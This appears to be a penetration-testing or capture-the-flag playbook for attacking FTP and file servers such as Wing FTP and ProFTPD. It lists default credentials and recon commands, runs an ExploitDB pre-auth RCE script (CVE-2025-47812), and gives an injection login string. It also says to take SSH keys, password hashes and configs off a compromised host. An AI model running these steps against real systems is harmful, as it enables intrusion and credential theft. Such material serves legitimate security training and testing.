# Archetype: Custom FTP / File Server

**Match if you see:** Wing FTP, FileZilla Server, ProFTPD, Pure-FTPd,
vsftpd custom config, web-based FTP clients, any file-sharing service
with a web UI.

## Why these are juicy

File server software is consistently under-audited:
- Web admin panels added later, often vulnerable
- Lua / Python scripting features are exec sinks
- Anonymous access often enabled by default
- Cleartext protocols leak creds
- Server runs with file-system privileges (often root for SUID-style ops)

## Fast checks (≤ 5 min)

```bash
# 1) Banner/version
nc -nv target 21              # FTP banner
curl -sI http://target/login.html | grep -i server
curl -s http://target/ | grep -iE "wing|filezilla|proftpd|pure-ftpd|version"

# 2) Anonymous FTP
ftp -n target <<EOF
quote USER anonymous
quote PASS anonymous@
ls
EOF

# 3) Common web admin paths (Wing FTP)
curl -s http://target/admin/login.html
curl -s http://target/admin_loginok.html
curl -s http://target/login.html
curl -s http://target/dir.html

# 4) Default creds
admin / admin
admin / wingftp
admin / changeme
anonymous / anonymous
ftp / ftp
```

## Deep checks

### A. Wing FTP — CVE-2025-47812 (the WingData angle)
```bash
# Pre-auth RCE via Lua injection
locate 52347.py
python3 /usr/share/exploitdb/exploits/multiple/remote/52347.py \
  -u http://target -c "id"

# If sessions get exhausted (this exploit creates session files):
# Wait 5-10 min, or hit it less aggressively. The session limit is per
# username; try injecting different usernames.
```

### B. ProFTPD CVEs
- **mod_copy** abuse (CVE-2015-3306): `SITE CPFR` / `SITE CPTO` to write files
- **mod_sql injection** (older): test with `quote USER admin'--`
- **Bypass via Telnet IAC** (older)

### C. Other CVE patterns to try
- **vsftpd 2.3.4 backdoor** (smiley face → port 6200 shell)
- **FileZilla Server** — admin port 14147 default, often weak password

### D. Source dive
```bash
# Wing FTP is closed-source but has Lua scripts in /opt/wftpserver/lua/
# Once you have any RCE, exfil those scripts — they reveal server logic.

# For open-source FTPs:
bash scripts/source-dive.sh proftpd/proftpd <version>
bash scripts/source-dive.sh pyftpdlib/pyftpdlib
```

### E. Post-RCE pivot
File-server processes typically have access to:
- All shared directories (read user's files for SSH keys, .bash_history)
- User account database (`/opt/wftpserver/Settings/`)
- TLS certs and private keys
- Service config with admin credentials

## Common pitfalls

1. **Stopping at "wingftp user, no sudo"** — wrong. Read `/home/<other-users>/`
   if readable, exfil any private SSH keys, exfil server configs.
2. **Ignoring SSH** — services that share creds with FTP often share with SSH.
3. **Forgetting passive mode** — anonymous FTP behaves differently in PASV vs
   PORT. Test both.
4. **Not checking the web admin separately** — many FTP servers have a web
   admin port (5466 for Wing FTP) with separate auth.

## Pivot targets after access

- `/opt/wftpserver/Settings/Server.xml` — admin password hash
- `/opt/wftpserver/wftp_default_ssh.key`
- `/etc/proftpd/proftpd.conf` — module list (more attack surface)
- `/var/log/proftpd/auth.log` — leaks usernames
- `~/.ssh/` for every user found in the FTP user db
